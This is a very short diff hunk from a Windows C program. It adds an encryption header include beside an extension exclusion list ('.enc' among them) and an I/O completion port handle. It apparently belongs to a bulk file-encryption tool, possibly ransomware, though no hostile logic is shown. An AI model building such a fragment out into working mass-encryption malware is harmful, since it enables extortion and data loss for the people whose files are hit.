@@ -7,7 +7,7 @@
 #include <stdio.h>
 #include <malloc.h>
 #include <processthreadsapi.h>
-
+#include <c_crypt.h>
 char *exclude[]={".pdf",".txt",".enc"};
 HANDLE CompletionPort;
 
